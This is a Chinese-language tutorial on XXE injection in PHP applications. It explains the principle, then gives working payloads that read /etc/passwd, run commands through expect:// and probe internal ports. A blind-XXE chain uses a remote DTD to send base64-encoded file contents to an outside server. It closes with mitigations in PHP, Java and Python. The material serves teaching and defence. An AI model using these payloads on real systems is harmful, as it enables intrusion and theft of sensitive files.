# 原创
：  XXE-XML外部实体注入

# XXE-XML外部实体注入

#### XXE-XML外部实体注入

## 环境

> 
PHP 7.0.30、Libxml 2.8.0（Libxml2.9.0以后默认不解析外部实体，对于PHP版本不影响XXE的利用）


## 原理介绍

> 
XML 被设计为传输和存储数据,其焦点是数据的内容，HTML 被设计用来显示数据，其焦点是数据的外观，HTML 旨在显示信息，而 XML旨在传输信息<br/> XML特点：XML 被设计用来结构化、存储以及传输信息，仅仅是纯文本，有能力处理纯文本的软件都可以处理 XML，XML允许创作者定义自己的标签和自己的文档结构，XML 是独立于软件和硬件的信息传输工具，所有现代浏览器都有读取和操作 XML 的内建 XML解析器，但是不同的浏览器解析的方法不一样的，如在IE中使用loadXML()方法，在其他浏览器中使用DOMParser<br/> loadXML()方法用于加载字符串文本，load()方法用于加载文件，解析器把XML 载入内存，然后把它转换为可通过 JavaScript 访问的 XML DOM 对象


## 漏洞危害

> 
- 读取任意文件<br/> file 协议：`file:///etc//passwd`<br/> php 协议：`php://filter/read=convert.base64-encode/resource=index.php`- 执行系统命令<br/> 部分情况会有，在特殊的配置环境下，如PHP环境中PHP的expect模块被加载到了易受攻击的系统或者能处理XML的应用中，就能执行命令，简单payload如下


```
&lt;?xml version="1.0" encoding="utf-8"?&gt; 
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM "expect://ifconfig" &gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;

```

> 
- 探测内网端口<br/> 借助漏洞实现内网探测，常见payload如下


```
&lt;?xml version="1.0" encoding="utf-8"?&gt; 
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY&gt;
&lt;!ENTITY xxe SYSTEM "http://192.168.199.100:80"&gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;

```

> 
- 攻击内网网站(dos或者直接吃服务器资源导致无法正常服务)


## 例子

### 有回显

> 



```
&lt;?php
$data = file_get_contents('php://input');
$xml = simplexml_load_string($data);

echo $xml-&gt;name;

```

> 



```
&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE xxe [
&lt;!ELEMENT name ANY &gt;
&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;
&lt;root&gt;
&lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;

```

### 无回显

> 
无回显的XXE利用必须借助外部服务器把回显内容带出来，这种的XXE也称为 blind XXE



```
&lt;?php
$data = file_get_contents('php://input');

$dom = new DOMDocument();
$dom-&gt;loadXML($data);

```

> 
如果直接执行的话是没有任何回显的，可以使用http协议将请求发送到远程服务器上，从而获取文件内容<br/> 首先在远程服务器写入一个dtd文件，例如test.dtd，文件内容如下


```
注意：%号需要实体16进制编码为&amp;#x25;
&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"&gt;
&lt;!ENTITY % int "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.2.1/%file;'&gt;"&gt;

```

> 
利用Payload，将数据外带到服务端


```
&lt;!DOCTYPE convert [
&lt;!ENTITY % remote SYSTEM "http://192.168.2.1/test.dtd"&gt;
%remote;%int;%send;
]&gt;

```

> 
执行逻辑大概如下：
- 从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote先调用，调用后请求远程服务器上的test.dtd ，有点类似于将 test.dtd包含进来- %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件- 将 %file 的结果填入到 %send 以后 (因为实体的值中不能有 %, 所以将其转成html实体编码 &amp;#x25;)，- 再调用 %send; 把我们的读取到的数据以GET请求的方式发送到我们的服务器上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题


## 解决方案和建议

> 
- 使用开发语言提供的禁用外部实体的方法


```
PHP：
libxml_disable_entity_loader(true);

JAVA:
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

Python：
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))

```

> 
- 过滤用户提交的XML数据


```
&lt;!DOCTYPE和&lt;!ENTITY，SYSTEM和PUBLIC

```

## 更进一步的学习XXE

> 
更进一步的学习XXE的相关知识和利用方式可以参考这篇文章中的内容：[链接地址](https://xz.aliyun.com/t/3357)

